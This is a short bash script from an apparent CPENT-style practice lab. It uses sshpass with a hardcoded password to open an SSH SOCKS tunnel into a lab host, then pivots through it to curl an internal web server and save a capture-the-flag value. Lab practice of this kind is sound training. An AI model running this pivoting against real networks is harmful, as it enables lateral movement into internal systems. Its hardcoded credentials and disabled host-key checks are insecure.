#!/bin/bash
cd "/home/chifay/Whoami-Labs/Titan Linux" || exit 1
clear
printf '\033]0;TITAN VECTOR 5 PIVOT KALI\007'
echo "=================================================================="
echo " TITAN LINUX - PIVOTING DESDE KALI (SOCKS SSH -D)"
echo " Fecha: $(date)"
echo "=================================================================="
echo
echo '$ sshpass -p password123 ssh -D 1080 -N -f ubuntu@192.168.60.132'
sshpass -p password123 ssh -D 1080 -N -f -o StrictHostKeyChecking=no ubuntu@192.168.60.132 && echo "[+] Tunel SOCKS activo en 127.0.0.1:1080"
sleep 2
echo
echo '$ curl --socks5-hostname 127.0.0.1:1080 http://10.10.50.1:8080'
curl -s --max-time 10 --socks5-hostname 127.0.0.1:1080 http://10.10.50.1:8080 | tee "evidencias/term_pivot_kali.html" | grep -E 'TitanCorp|CPENT|FLAG'
echo
echo "[+] Flag de pivoting:"
curl -s --max-time 10 --socks5-hostname 127.0.0.1:1080 http://10.10.50.1:8080 | grep -o 'CPENT{[^}]*}' | tee "loot/flag_pivoting_desde_kali.txt"
pkill -f 'ssh -D 1080' 2>/dev/null
echo
echo "### FIN ETAPA 5 ###"
touch /tmp/opencode/stage5.done
sleep 3600
